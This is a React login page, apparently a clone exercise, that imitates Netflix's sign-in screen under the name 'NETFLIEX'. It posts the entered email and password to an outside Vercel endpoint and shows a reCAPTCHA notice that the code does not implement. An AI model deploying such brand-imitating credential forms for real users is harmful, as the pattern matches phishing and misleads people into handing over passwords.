import { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!email || !password) {
      setError("Please enter both email and password");
      return;
    }
    try {
      const res = await axios.post("https://login-ajay-thangam.vercel.app/",{ email, password });
      if (res.data.success) {
        navigate("/dashboard");
      } else {
        navigate("/failed");
      }
    } catch {
      setError("Server error. Try again.");
    }
  };

  return (
    <div className="min-h-screen bg-linear-to-b from-red-950 via-red-950 to-black text-white">

      <nav className="w-full p-6 border-b border-gray-700">
        <h1 className="text-red-600 text-4xl font-bold px-16">NETFLIEX</h1>
      </nav>

      <div className="flex items-center justify-center mt-12">
        <form
          onSubmit={handleSubmit}
          className="flex flex-col w-[35rem] p-8 text-white"
        >
          <p className="text-gray-300 text-left mb-2 font-bold text-4xl">
            Enter your info to sign in
          </p>
          <p className="text-xl text-gray-300 text-left mb-8 "> Or get started with a new account.</p>

          {error && <p className="text-red-500 mb-4 text-center">{error}</p>}

          <input
            type="text"
            placeholder="Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full p-4 mb-4 rounded bg-gray-800 focus:outline-none focus:ring-2 focus:ring-gray-200"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-4 mb-6 rounded bg-gray-800 focus:outline-none focus:ring-2 focus:ring-gray-200"
          />
          <button className="w-full bg-red-600 hover:bg-red-700 py-4 rounded font-semibold text-lg">
            Continue
          </button>


          <div className="mt-6 text-center">
            <button className="text-gray-400 hover:text-white text-sm">
              Get Help
            </button>
          </div>


          <p className="text-gray-500 text-xs mt-6 text-center">
            This page is protected by Google reCAPTCHA to ensure you're not a bot.{" "}
            <span className="text-blue-400 hover:underline cursor-pointer">Learn more</span>
          </p>
        </form>
      </div>
    </div>
  );
}